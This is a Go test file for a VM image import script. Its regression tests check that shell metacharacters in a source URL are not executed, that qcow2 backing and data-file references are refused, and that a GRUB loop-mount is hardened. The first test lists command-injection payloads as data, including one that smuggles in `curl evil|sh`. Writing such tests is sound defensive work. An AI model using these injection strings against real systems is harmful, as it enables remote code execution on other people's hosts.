package swiftimage

import "strings"

import "testing"

// The source URL must never appear in the script text. It is delivered as an
// env var and dereferenced as "$SOURCE_URL", so shell metacharacters in it are
// inert: the shell does not re-scan the value of a variable it expands.
//
// Regression: the script was built with fmt.Sprintf("%q"), which escapes " and
// \ but NOT $ or backticks — and the result sat inside shell double quotes, so
// a URL like https://x/$(id) executed inside a root, privileged container.
func TestImportScript_DoesNotInterpolateSourceURL(t *testing.T) {
	payloads := []string{
		`https://x/$(id>/tmp/pwned)`,
		"https://x/`whoami`",
		`https://x/${IFS}evil`,
		`https://x/"; curl evil|sh; echo "`,
	}
	for _, format := range []string{"qcow2", "raw"} {
		for _, osType := range []string{"linux", "windows"} {
			script := importScript(format, osType)
			for _, p := range payloads {
				if strings.Contains(script, p) {
					t.Errorf("format=%s os=%s: script interpolates the URL %q", format, osType, p)
				}
			}
			// It must dereference the env var instead.
			if !strings.Contains(script, `"$`+importSourceURLEnv+`"`) {
				t.Errorf("format=%s os=%s: script does not read $%s: %s", format, osType, importSourceURLEnv, script)
			}
		}
	}
}

// A qcow2 whose header names a backing file or an external data file must be
// refused before `qemu-img convert` runs. convert transparently follows those
// references, so without the guard it copies bytes from OUTSIDE the tenant image
// (a host device, another tenant's file) into the output raw the guest boots.
// This covers the http path (checks $SRC) and the oci path (checks $OUTPUT).
func TestImportScript_RefusesQcow2BackingAndDataFile(t *testing.T) {
	scripts := map[string]string{
		"http": importScript("qcow2", "linux"),
		"oci":  importScriptOCI("qcow2", "linux"),
	}
	for name, script := range scripts {
		// The guard must run before the convert.
		guard := strings.Index(script, "qemu-img info")
		convert := strings.Index(script, "qemu-img convert")
		if guard < 0 {
			t.Errorf("%s: no qemu-img info safety check before convert", name)
			continue
		}
		if convert >= 0 && guard > convert {
			t.Errorf("%s: safety check runs after convert (guard=%d convert=%d)", name, guard, convert)
		}
		for _, key := range []string{`"backing-filename"`, `"full-backing-filename"`, `"data-file"`} {
			if !strings.Contains(script, key) {
				t.Errorf("%s: safety check does not reject %s", name, key)
			}
		}
		if !strings.Contains(script, "exit 1") {
			t.Errorf("%s: safety check does not fail the job", name)
		}
	}
}

// The Linux GRUB loop-mount must use nosymfollow so a symlink planted in the
// tenant image (e.g. boot/grub/grub.cfg.tmp -> /dev/sda) cannot redirect the
// in-place sed/mv writes to a path outside the image. nodev/nosuid/noexec
// harden the mount further.
func TestImportScript_GRUBMountRefusesSymlinkEscape(t *testing.T) {
	script := grubPatchBlock("linux")
	for _, opt := range []string{"nosymfollow", "nodev", "nosuid", "noexec"} {
		if !strings.Contains(script, opt) {
			t.Errorf("GRUB loop-mount missing hardening option %q", opt)
		}
	}
	if strings.Contains(script, "mount -o loop,offset=") {
		t.Error("GRUB loop-mount still uses the unhardened `loop,offset=` options")
	}
	// Windows has no GRUB patch and so no mount at all.
	if win := grubPatchBlock("windows"); strings.Contains(win, "mount") {
		t.Errorf("windows import must not loop-mount: %s", win)
	}
}
